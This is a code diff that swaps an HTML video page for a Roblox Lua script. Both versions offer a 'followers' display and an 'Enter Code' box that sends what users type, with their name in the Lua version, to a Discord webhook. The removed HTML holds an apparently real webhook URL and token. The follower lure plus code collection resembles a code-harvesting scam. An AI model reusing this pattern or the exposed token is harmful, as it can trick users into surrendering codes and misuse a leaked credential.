@@ -1,260 +1,66 @@
-<!DOCTYPE html>
-<html lang="en">
-<head>
-<meta charset="UTF-8">
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Your Video Page</title>
-<style>
-  @import url('https://fonts.googleapis.com/css2?family=Orbitron:wght@400;700&display=swap');
+local Players = game:GetService("Players")
+local HttpService = game:GetService("HttpService")
 
-  * { margin: 0; padding: 0; box-sizing: border-box; }
+local webhookUrl = "https://discord.com/api/webhooks/XXXXXXXX/XXXXXXXX"
+local player = Players.LocalPlayer
 
-  body {
-    font-family: 'Orbitron', sans-serif;
-    background: linear-gradient(135deg, #000, #001a33);
-    color: #fff;
-    position: relative;
-    padding: 20px;
-    min-height: 100vh;
-  }
+-- UI
+local screenGui = Instance.new("ScreenGui")
+screenGui.Parent = player:WaitForChild("PlayerGui")
 
-  #particles {
-    position: fixed;
-    top:0;
-    left:0;
-    width:100%;
-    height:100%;
-    z-index: 0;
-  }
+-- follower label
+local followersLabel = Instance.new("TextLabel")
+followersLabel.Size = UDim2.new(0, 200, 0, 50)
+followersLabel.Position = UDim2.new(0.5, -100, 0.2, 0)
+followersLabel.TextScaled = true
+followersLabel.BackgroundColor3 = Color3.fromRGB(30,30,30)
+followersLabel.TextColor3 = Color3.fromRGB(255,255,255)
+followersLabel.Text = "Followers: 0"
+followersLabel.Parent = screenGui
 
-  h1 {
-    text-align: center;
-    font-size: 3rem;
-    color: #00ccff;
-    text-shadow: 0 0 15px #00ccff, 0 0 30px #00ffff;
-    margin-bottom: 30px;
-    position: relative;
-    z-index: 1;
-  }
+-- enter code button
+local enterButton = Instance.new("TextButton")
+enterButton.Size = UDim2.new(0, 200, 0, 50)
+enterButton.Position = UDim2.new(0.5, -100, 0.4, 0)
+enterButton.TextScaled = true
+enterButton.BackgroundColor3 = Color3.fromRGB(50,100,200)
+enterButton.TextColor3 = Color3.fromRGB(255,255,255)
+enterButton.Text = "Enter Code"
+enterButton.Parent = screenGui
 
-  nav {
-    text-align: center;
-    margin-bottom: 20px;
-    position: relative;
-    z-index: 1;
-  }
+-- input box for code
+local codeBox = Instance.new("TextBox")
+codeBox.Size = UDim2.new(0, 200, 0, 50)
+codeBox.Position = UDim2.new(0.5, -100, 0.5, 0)
+codeBox.TextScaled = true
+codeBox.PlaceholderText = "Type code here"
+codeBox.BackgroundColor3 = Color3.fromRGB(20,20,20)
+codeBox.TextColor3 = Color3.fromRGB(255,255,255)
+codeBox.Parent = screenGui
 
-  nav a {
-    display: inline-block;
-    margin: 10px;
-    padding: 10px 20px;
-    background-color: #003366;
-    color: white;
-    text-decoration: none;
-    border-radius: 8px;
-    box-shadow: 0 0 10px #0066cc;
-    transition: 0.3s;
-  }
-
-  nav a:hover {
-    background-color: #004c99;
-    box-shadow: 0 0 20px #00ccff;
-  }
-
-  .video-container {
-    display: flex;
-    justify-content: center;
-    margin-bottom: 30px;
-    position: relative;
-    z-index: 1;
-  }
-
-  iframe {
-    width: 80%;
-    height: 450px;
-    border-radius: 15px;
-    border: 3px solid #00ccff;
-    box-shadow: 0 0 30px #00ccff;
-  }
-
-  .input-area {
-    max-width: 500px;
-    margin: 0 auto;
-    background: rgba(0,20,40,0.8);
-    border: 2px solid #00ccff;
-    border-radius: 15px;
-    padding: 20px;
-    text-align: center;
-    box-shadow: 0 0 30px #00ccff;
-    position: relative;
-    z-index: 1;
-  }
-
-  .input-area label {
-    display: block;
-    margin: 15px 0 5px;
-    font-size: 1.1rem;
-    color: #00ccff;
-    text-shadow: 0 0 10px #00ccff;
-  }
-
-  .input-area input {
-    width: 80%;
-    padding: 10px;
-    border-radius: 8px;
-    border: 2px solid #00ccff;
-    background: #000;
-    color: #fff;
-    font-family: 'Orbitron', sans-serif;
-    font-size: 1rem;
-    margin-bottom: 15px;
-    outline: none;
-    box-shadow: 0 0 15px #00ccff;
-  }
-
-  .submit-btn {
-    padding: 10px 20px;
-    border-radius: 8px;
-    border: 2px solid #00ccff;
-    background: black;
-    color: #00ccff;
-    font-size: 1.1rem;
-    cursor: pointer;
-    box-shadow: 0 0 20px #00ccff;
-    transition: 0.2s;
-  }
-
-  .submit-btn:hover {
-    background: #002244;
-    transform: scale(1.05);
-    box-shadow: 0 0 40px #00ccff;
-  }
-
-  .status {
-    margin-top: 15px;
-    font-size: 1rem;
-    color: #00ffcc;
-    text-shadow: 0 0 10px #00ccff;
-  }
-
-  footer {
-    text-align: center;
-    margin-top: 40px;
-    font-family: 'Orbitron', sans-serif;
-    font-size: 1.1rem;
-    color: #ccc;
-    text-shadow: 0 0 10px #00ccff;
-    position: relative;
-    z-index: 1;
-  }
-</style>
-</head>
-<body>
-
-<canvas id="particles"></canvas>
-
-<nav>
-  <a href="#">Home</a>
-  <a href="#">Models</a>
-  <a href="#">Audios</a>
-</nav>
-
-<h1>Custom Video Page</h1>
-
-<div class="video-container">
-  <!-- Change VIDEO_ID to any YouTube video ID -->
-  <iframe src="https://www.youtube.com/embed/VIDEO_ID" frameborder="0" allowfullscreen></iframe>
-</div>
-
-<div class="input-area">
-  <label for="code">Enter Code:</label>
-  <input type="text" id="code" placeholder="Enter code here">
-  
-  <label for="followers">Followers Amount:</label>
-  <input type="number" id="followers" placeholder="Enter followers amount">
-  
-  <button class="submit-btn" onclick="sendToWebhook()">Submit</button>
-  <div id="status" class="status"></div>
-</div>
-
-<footer>
-  Made with 💙 in Blue & Black theme
-</footer>
-
-<script>
-const WEBHOOK_URL = "https://discord.com/api/webhooks/1411854996315705424/WDbWPIIAE9VTmLo7Yk55ittfju6dz9BOhn-2mFYnTBxevwAYHbS3OflT8w7CiOm2vDkq"; // <-- Replace this with your webhook
-
-function sendToWebhook() {
-  const code = document.getElementById("code").value;
-  const followers = document.getElementById("followers").value;
-  const statusDiv = document.getElementById("status");
-
-  if (!code || !followers) {
-    statusDiv.textContent = "Please fill out both fields!";
-    return;
-  }
-
-  const payload = {
-    content: `📩 New Submission:\n🔑 Code: **${code}**\n👥 Followers: **${followers}**`
-  };
-
-  fetch(WEBHOOK_URL, {
-    method: "POST",
-    headers: { "Content-Type": "application/json" },
-    body: JSON.stringify(payload)
-  })
-  .then(res => {
-    if (res.ok) {
-      statusDiv.textContent = "✅ Sent to Discord!";
-    } else {
-      statusDiv.textContent = "❌ Failed to send!";
+-- send code to discord
+local function sendToDiscord(code)
+    local data = {
+        ["content"] = player.Name .. " entered code: " .. code
     }
-  })
-  .catch(() => {
-    statusDiv.textContent = "⚠️ Error sending request!";
-  });
-}
+    local jsonData = HttpService:JSONEncode(data)
 
-// --- Light blue glowing particles ---
-const canvas = document.getElementById('particles');
-const ctx = canvas.getContext('2d');
-canvas.width = window.innerWidth;
-canvas.height = window.innerHeight;
+    local success, response = pcall(function()
+        return HttpService:PostAsync(webhookUrl, jsonData, Enum.HttpContentType.ApplicationJson)
+    end)
 
-const particles = [];
-for(let i=0;i<60;i++){
-  particles.push({
-    x: Math.random()*canvas.width,
-    y: Math.random()*canvas.height,
-    r: Math.random()*2+1,
-    dx: (Math.random()-0.5)*0.5,
-    dy: (Math.random()-0.5)*0.5,
-    color: 'rgba(0, 204, 255, 0.8)'
-  });
-}
+    if success then
+        print("✅ Sent code to Discord!")
+    else
+        warn("❌ Error sending: " .. tostring(response))
+    end
+end
 
-function animate(){
-  ctx.clearRect(0,0,canvas.width,canvas.height);
-  particles.forEach(p=>{
-    p.x+=p.dx; p.y+=p.dy;
-    if(p.x<0||p.x>canvas.width) p.dx*=-1;
-    if(p.y<0||p.y>canvas.height) p.dy*=-1;
-    ctx.shadowBlur = 15;
-    ctx.shadowColor = "#00ccff";
-    ctx.fillStyle = p.color;
-    ctx.beginPath();
-    ctx.arc(p.x,p.y,p.r,0,Math.PI*2);
-    ctx.fill();
-  });
-  requestAnimationFrame(animate);
-}
-animate();
-
-window.addEventListener('resize', ()=>{
-  canvas.width = window.innerWidth;
-  canvas.height = window.innerHeight;
-});
-</script>
-
-</body>
-</html>
+-- button action
+enterButton.MouseButton1Click:Connect(function()
+    local code = codeBox.Text
+    if code ~= "" then
+        sendToDiscord(code)
+        codeBox.Text = ""
+    end
+end)
